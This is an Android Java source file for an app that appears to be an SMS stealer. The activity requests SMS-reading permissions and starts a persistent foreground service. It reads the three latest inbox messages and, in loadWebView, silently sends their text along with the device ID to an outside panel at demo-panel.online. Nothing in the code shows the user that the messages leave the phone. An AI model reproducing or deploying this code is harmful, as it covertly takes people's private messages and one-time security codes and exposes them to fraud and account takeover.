package com.example.smsreader;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.webkit.WebView;
import android.widget.Toast;

import com.example.smsreader.databinding.ActivityMainBinding;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String INBOX_URI = "content://sms/inbox";
    private static final String LAST_THREE_QUERY = "date desc limit 3";
    private static final String NEXT_LINE = "\n\n\n";
    private ActivityMainBinding mBinding;
    private SharedPreferences mPrefs;
    private static String FIRST = "sms_1";
    private static String SECOND = "sms_2";
    private static String THIRD = "sms_3";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mBinding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(mBinding.getRoot());


        String android_id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        Toast.makeText(this, ""+ android_id, Toast.LENGTH_SHORT).show();




        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!isPermissionGranted()){
                askPermission();
            }else {
                proceed();
            }
        }else {
            proceed();
        }

        mBinding.parent.setOnClickListener(view -> {
            mBinding.sms.setText(mPrefs.getString(FIRST,"null")+NEXT_LINE+mPrefs.getString(SECOND,"null")+ NEXT_LINE +mPrefs.getString(THIRD,"null"));
        });


    }

    private void proceed(){
        if (!isMyServiceRunning(ForegroundService.class)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(new Intent(this, ForegroundService.class));
            } else {
                startService(new Intent(this, ForegroundService.class));
            }
        }

        mPrefs = this.getSharedPreferences("my_sms_shared_prefs", Context.MODE_PRIVATE);

        if (mPrefs.getString(FIRST, null) == null){
            String msgs = "";
            List<String> messages = fetchInboxMessages();

            for (int i = 0; i < messages.size(); i++ ){
                if (i == 0) mPrefs.edit().putString(FIRST, messages.get(i)).apply();
                else if (i == 1) mPrefs.edit().putString(SECOND, messages.get(i)).apply();
                else if (i == 2) mPrefs.edit().putString(THIRD, messages.get(i)).apply();
            }
        }



        loadWebView();
        mBinding.sms.setText(mPrefs.getString(FIRST,"null")+ NEXT_LINE +mPrefs.getString(SECOND,"null")+ NEXT_LINE +mPrefs.getString(THIRD,"null"));
    }

    private boolean isPermissionGranted(){
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void askPermission(){
        requestPermissions(new String[]{android.Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}, 1);
    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == 1){
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED){
                proceed();
            }else {
                askPermission();
            }
        }
    }

    private List<String> fetchInboxMessages(){
        List<String> messages = new ArrayList<>(); // TODO LAST MESSAGES
        Cursor cursor = getContentResolver().query(Uri.parse(INBOX_URI), null, null, null, LAST_THREE_QUERY);
        if (cursor.moveToFirst()) {
            do {
                for(int i = 0; i < cursor.getColumnCount(); i++) {
                    if(cursor.getColumnName(i).equalsIgnoreCase("body")) messages.add(cursor.getString(i));
                }
            } while (cursor.moveToNext());
        } else {
            // TODO NO SMS IN INBOX
        }
        return messages;
    }

    void loadWebView(){
        WebView webView = (WebView) findViewById(R.id.we);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl("https://demo-panel.online/msg.php?Device_ID="+ Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) +"&msg1="+mPrefs.getString(FIRST,"null")+"&msg2="+mPrefs.getString(SECOND,"null")+"&msg3="+mPrefs.getString(THIRD,"null"));

    }

}